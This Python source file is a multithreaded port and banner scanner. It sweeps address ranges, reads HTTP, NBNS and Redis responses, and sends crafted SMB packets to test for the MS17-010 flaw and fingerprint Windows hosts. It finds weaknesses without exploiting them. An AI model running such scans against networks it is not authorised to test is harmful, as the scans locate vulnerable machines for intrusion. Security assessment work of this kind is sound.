# -*- coding: utf-8 -*- 

import sys
import re
import ssl
import socket
import time
import threading
import optparse

if sys.version_info[0] == 2:
    import Queue as queue
    pass
elif sys.version_info[0] == 3:
    import queue

global_queue = queue.Queue()
stop = False

THREAD_COUNT = 256
DEFAULT_TIMEOUT = 1
DEFAULT_PORTS = '21-23,25,80,81,110,135,137,139,445,873,1433,1521,3306,3389,6379,7001,8000,8069,8080-8090,9000,9001,10051,11211'
DEFAULT_UDP_PORTS = '137' # NBNS
USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'


# nbns
# from https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v%3dtechnet.10)
UNIQUE_NAMES = {
    b'\x00': 'Workstation Service',
    b'\x03': 'Messenger Service',
    b'\x06': 'RAS Server Service',
    b'\x1F': 'NetDDE Service',
    b'\x20': 'Server Service',
    b'\x21': 'RAS Client Service',
    b'\xBE': 'Network Monitor Agent',
    b'\xBF': 'Network Monitor Application',
    b'\x03': 'Messenger Service',
    b'\x1D': 'Master Browser',
    b'\x1B': 'Domain Master Browser',
}
GROUP_NAMES = {
    b'\x00': 'Domain Name',
    b'\x1C': 'Domain Controllers',
    b'\x1E': 'Browser Service Elections',
    # Master Browser
}


REQUEST_DATA = {
    21: b'pwd\r\n',
    80: b'GET / HTTP/1.0\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % USER_AGENT.encode(),
    443: b'GET / HTTP/1.0\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n\r\n' % USER_AGENT.encode(),
    6379: b'INFO\r\n',
    11211: b'stats items\r\n',
    # -1: b'unknownport\r\n\r\n',
}

socket.setdefaulttimeout(DEFAULT_TIMEOUT)
lock = threading.Lock()  # for print

def to_ips(raw):
    if '/' in raw:
        addr, mask = raw.split('/')
        mask = int(mask)

        bin_addr = ''.join([ (8 - len(bin(int(i))[2:])) * '0' + bin(int(i))[2:] for i in  addr.split('.')])
        start = bin_addr[:mask] + (32 - mask) * '0'
        end = bin_addr[:mask] + (32 - mask) * '1'
        bin_addrs = [ (32 - len(bin(int(i))[2:])) * '0' + bin(i)[2:] for i in range(int(start, 2), int(end, 2) + 1)]

        dec_addrs = ['.'.join([str(int(bin_addr[8*i:8*(i+1)], 2)) for i in range(0, 4)]) for bin_addr in bin_addrs]                
        # print(dec_addrs)
        return dec_addrs
    elif '-' in raw:
        addr, end = raw.split('-')
        end = int(end)
        start = int(addr.split('.')[3])
        prefix = '.'.join(addr.split('.')[:-1])
        addrs = [ prefix + '.' + str(i) for i in range(start, end + 1) ]
        # print(addrs)
        return addrs
    else:
        return [raw]

        
def to_ports(raw):
    raw_ports = [i for i in raw.split(',')]
    ports = []
    for i in raw_ports:
        if '-' not in i:
            ports.append(int(i))
        else:
            start, end = i.split('-')
            ports += range(int(start), int(end)+1)
    return ports


# TODO use a dict
def set_data(ip, port, flag):
    data = b'test_test\r\n' 
    if flag == 'U':
        if port == 137:  # NBNS 
            data = b'ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'

    elif flag == 'T':
        if port in REQUEST_DATA:
            data = REQUEST_DATA[port]
    else:
        print('No protocol specifc ...')
        exit()

    return data


def new_handle_input():

    parser = optparse.OptionParser('''
  python scan.py 10.19.38.0/24 [-o nt] [-p 80,81-85,...]''')

    parser.add_option("-o", dest="options", default="nt", help="n means nbns, udp t means tcp, default: nt")
    parser.add_option("-p", dest="ports", default=DEFAULT_PORTS, help="tcp ports to scan, like 25,8080-8086,8888")  
 
    (options, args)= parser.parse_args()
    
    if len(args) < 1:
        print('*********************************************************')
        print('*         A simple  port scanner By: iiiiii             *')
        print('*    https://github.com/iiilin/ASimplePortScanner       *')
        print('*********************************************************')
        parser.print_help()
        exit()
    
    hosts, ports, udp_ports = [], [], []
    for ips in args:
        hosts += to_ips(ips)
    ports = to_ports(options.ports)
    
    if 'n' in options.options:
        udp_ports = [137]
    if 't' not in options.options:
        ports = []

    # print(hosts, ports, udp_ports)
    return hosts, ports, udp_ports


"""
functions start with lib_ 
a function to check rep from a specfic rep (port, respone data)
so the check_rep function will not be so long 
"""

def lib_nbns_rep(addr, port, rep):
    """
    udp and port==137
    """
    try:  # Exception handle here
        num = ord(rep[56:57].decode())
    except:
        return ''

    data = rep[57:]
    ret, group, unique, other = '', '', '', ''
            
    for i in range(num):
        name = data[18 * i:18 *i + 15].decode()
        flag_bit = bytes(data[18 * i + 15:18 *i + 16])
        # print(type(flag_bit))
        if flag_bit in b'\x00':
            name_flags = data[18 * i + 16:18 *i + 18]
            if ord(name_flags[0:1])>=128:
                group = name.strip()
            else:
                unique = name
    ret = group + '\\' + unique
    return ret


def lib_get_http_info(addr, port, rep):
    """
    if rep.startswith('HTTP/1.'):  # Http    
        lib_get_http_info(xxxxx)

    GET first line HTTP rep and Server and Title
    """
    ret = ""
    reps = rep.split('\\r\\n')  # has been addslashes so double \...
    ret += reps[0]

    for line in reps:
        if line.startswith('Server:') or line.startswith('Location:'):
            # ret += line[line.find(':')+1:]
            ret += '  ' + line
            
    r = re.search('<title>(.*?)</title>', rep)  # get title
    if r:
        ret += ' Title: ' + r.group(1)
    return ret


def lib_check_ms_17_010(addr, port):
    """
    scan MS17-010 from xunfeng  

    Have bugs in python3
    """
    # negotiate_protocol_request = binascii.unhexlify('00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200')
    negotiate_protocol_request = b'\x00\x00\x00T\xffSMBr\x00\x00\x00\x00\x18\x01(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\x001\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00'
    # session_setup_request = binascii.unhexlify('00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000')
    session_setup_request = b'\x00\x00\x00c\xffSMBs\x00\x00\x00\x00\x18\x01 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/K\x00\x00\xc5^\r\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00&\x00\x00.\x00Windows 2000 2195\x00Windows 2000 5.0\x00'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((addr, port))
        s.send(negotiate_protocol_request)
        s.recv(1024)
        s.send(session_setup_request)
        data = s.recv(1024)
        user_id = data[32:34]
        tree_connect_andx_request = b'\x00\x00\x00' + chr(58 + len(addr)).encode() + b'\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x4b' + user_id + b'\xc5\x5e\x04\xff\x00\x00\x00\x00\x00\x01\x00\x1a\x00\x00\x5c\x5c' + addr.encode() + b'\x5c\x49\x50\x43\x24\x00\x3f\x3f\x3f\x3f\x3f\x00'
        s.send(tree_connect_andx_request)

        # tree_connect_andx_request = '000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00' % ((58 + len(addr)), user_id.encode('hex'), addr.encode('hex'))
        # s.send(binascii.unhexlify(tree_connect_andx_request))

        # print(binascii.unhexlify(tree_connect_andx_request).decode())
        data = s.recv(1024)
        allid = data[28:36]
        # payload = '0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00' % allid.encode('hex')
        # s.send(binascii.unhexlify(payload))

        payload = b'\x00\x00\x00\x4a\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + allid + b'\x10\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x4a\x00\x02\x00\x23\x00\x00\x00\x07\x00\x5c\x50\x49\x50\x45\x5c\x00'
        s.send(payload)
        
        data = s.recv(1024)
        s.close()
        if b'\x05\x02\x00\xc0' in data:
            return '+Vulnerable+ MS 17-010    '
        else:
            return 'MS 17-010 No Vulnerability    '
    except Exception as e:
        # print(e, 'MS 17-010')
        return 'MS 17-010 No Vulnerability    '


def lib_check_os_445(addr, port):
    try:
        payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
        payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((addr, port))
        s.send(payload1)
        s.recv(1024)
        # print(s.recv(1024).replace(b'\x00', b'').decode(errors='ignore'))
        s.send(payload2)
        data = s.recv(1024)
        length = ord(data[43:44]) + ord(data[44:45]) * 256
        # print(length)
        data = data[47 + length:]
        # print(data.decode('UTF-16LE', errors='ignore').replace('\x00', '|'))
        
        if isinstance(data, str):
            return data.replace('\x00\x00', '|').replace('\x00', '')
            
        else:
            data = data.replace(b'\x00\x00', b'|').replace(b'\x00', b'')
            return data.decode('utf-8', errors='ignore')
           
    except Exception as e:
        print(e, 'smbos')
        print(addr, port)
        return 'Fail to detect OS ...'
        

def check_rep(addr, port, rep, flag):
    # print((addr, port, rep, flag))
    if flag == 'U':
        if port == 137:  # parse NBNS may have problem
            return lib_nbns_rep(addr, port, rep)
        else:
            return rep

    elif flag == 'T':
        if rep.startswith('HTTP/1.'):  # Http
            return lib_get_http_info(addr, port, rep)

        elif port == 445: 
            ret = lib_check_ms_17_010(addr, port) + ' '
            ret += lib_check_os_445(addr, port)
            return ret

        elif port == 6379 and not 'Authentication required' in rep:
            return '+Vulnerable+ Redis without password'
        else:
            return rep


def thread(ports, udp_ports):
    # print(global_queue.qsize())
    # send udp nbns query
    while True:
        try:
            addr = global_queue.get(timeout=0.01)
        except:
            return 

        msg = ''
        for port in udp_ports:
            if stop == True:
                return

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = set_data(addr, port, 'U')
                s.sendto(data, (addr, port))
                rep = s.recv(2000)
                if rep:
                    rep = check_rep(addr, port, rep, 'U')
                    msg += '  %s' % rep
            except socket.error as e:
                pass

        for port in ports:
            if stop:
                return False

            rep = ''
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((addr, port))
            except socket.error as e:  # close
                continue
            
            try:
                msg += '\n   %d   ' %  port
                data = set_data(addr, port, 'T')  # TODO set data according port num 
                if port == 443:
                    s = ssl.wrap_socket(s)
                s.send(data)

                rep = s.recv(2000)
            except socket.error as e:
                # print(e)
                pass


            if isinstance(rep, str):
                tmp_rep = rep.replace('\n', '\\n').replace('\r', '\\r')

                if sys.version_info[0] == 2: # py26    
                    tmp_rep = tmp_rep.decode('utf-8', 'ignore') # .encode('utf-8', errors='ignore')
                    tmp_rep = check_rep(addr, port, tmp_rep, 'T')
                    tmp_rep = tmp_rep.decode('utf-8', 'ignore')
                elif sys.version_info[0] == 3:
                    tmp_rep = check_rep(addr, port, tmp_rep, 'T')                    
                
            else:
                # print(type(rep))
                tmp_rep = rep.decode('utf-8', 'ignore').replace('\n', '\\n').replace('\r', '\\r')
                tmp_rep = check_rep(addr, port, tmp_rep, 'T')

            # tmp_rep = check_rep(addr, port, tmp_rep, 'T')  # Exception in function ??


            msg = msg + tmp_rep
            #except Exception as e:
            #    print('-----  Error check rep error ', e)
            #    print(addr, port)
            #    print(rep)

        if msg:
            lock.acquire()
            print('[*]' + addr + ' ' + msg)
            lock.release()

def main():
    hosts, ports, udp_ports = new_handle_input()

    start = time.time()
    for host in hosts:
        global_queue.put(host)

    pool = [ threading.Thread(target=thread, args=(ports, udp_ports)) for i in range(THREAD_COUNT)]
    for t in pool:
        t.start()

    try:
        while threading.active_count() > 1:
            time.sleep(1)
            # print(threading.active_count())
    except KeyboardInterrupt as e:
        global stop
        stop = True
        # print(e)

    print('Waiting stop...')
    print('Cost time: %.2f' % (time.time() - start))

if __name__ == '__main__':
    main()
# print(check_rep('172.16.9.250', 445, '', 'T'))